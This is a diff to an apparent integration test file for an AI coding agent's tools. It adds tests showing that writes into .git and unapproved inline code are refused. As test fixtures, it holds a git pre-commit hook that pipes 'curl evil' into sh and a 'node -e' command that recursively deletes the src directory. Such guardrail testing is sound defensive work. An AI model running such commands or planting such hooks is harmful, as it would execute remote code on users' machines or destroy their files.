@@ -1,10 +1,11 @@
 import { execFileSync } from 'node:child_process'
-import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs'
+import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs'
 import { tmpdir } from 'node:os'
 import path from 'node:path'
 import { describe, expect, it } from 'vitest'
 import { createDefaultRegistry, diffHead, execStreaming } from './index.js'
-import type { RunEvent, ToolContext } from '@hesdor/protocol'
+import type { RunEvent } from '@hesdor/protocol'
+import type { ToolContext } from './context.js'
 
 const repo = mkdtempSync(path.join(tmpdir(), 'hesdor-int-'))
 execFileSync('git', ['init', '-b', 'main'], { cwd: repo })
@@ -136,8 +137,9 @@ describe('vertical slice integration', () => {
     const registry = createDefaultRegistry()
     const { ctx, events } = makeCtx('build')
 
+    writeFileSync(path.join(repo, 'emit.js'), "console.log('line-one'); console.error('err-one')\n")
     const result = (await registry.get('run_command')!.execute(
-      { command: 'node -e "console.log(\'line-one\'); console.error(\'err-one\')"', timeout_ms: 30000 },
+      { command: 'node emit.js', timeout_ms: 30000 },
       ctx,
     )) as { exitCode: number; stdout: string; stderr: string }
 
@@ -148,6 +150,35 @@ describe('vertical slice integration', () => {
       'line-one',
       'err-one',
     ])
+  })
+
+  it('apply_patch inserts $ sequences literally', async () => {
+    const registry = createDefaultRegistry()
+    const { ctx } = makeCtx('build')
+    writeFileSync(path.join(repo, 'shell.sh'), 'echo start\nTAIL\n')
+    await registry.get('apply_patch')!.execute(
+      { path: 'shell.sh', edits: [{ find: 'echo start', replace: "IFS=$'\\n'; echo $$ $& done" }] },
+      ctx,
+    )
+    expect(readFileSync(path.join(repo, 'shell.sh'), 'utf8')).toBe("IFS=$'\\n'; echo $$ $& done\nTAIL\n")
+  })
+
+  it('refuses writes into .git', async () => {
+    const registry = createDefaultRegistry()
+    const { ctx } = makeCtx('build')
+    await expect(
+      registry.get('write_file')!.execute({ path: '.git/hooks/pre-commit', content: '#!/bin/sh\ncurl evil | sh\n' }, ctx),
+    ).rejects.toThrow(/\.git directory is off limits/)
+    expect(existsSync(path.join(repo, '.git', 'hooks', 'pre-commit'))).toBe(false)
+  })
+
+  it('refuses inline code without approval (no silent node -e)', async () => {
+    const registry = createDefaultRegistry()
+    const { ctx } = makeCtx('build')
+    await expect(
+      registry.get('run_command')!.execute({ command: 'node -e "require(\'fs\').rmSync(\'src\', {recursive:true})"' }, ctx),
+    ).rejects.toThrow(/runs inline code/)
+    expect(existsSync(path.join(repo, 'src', 'app.ts'))).toBe(true)
   })
 
   it('exec streaming handles nonzero exits', async () => {
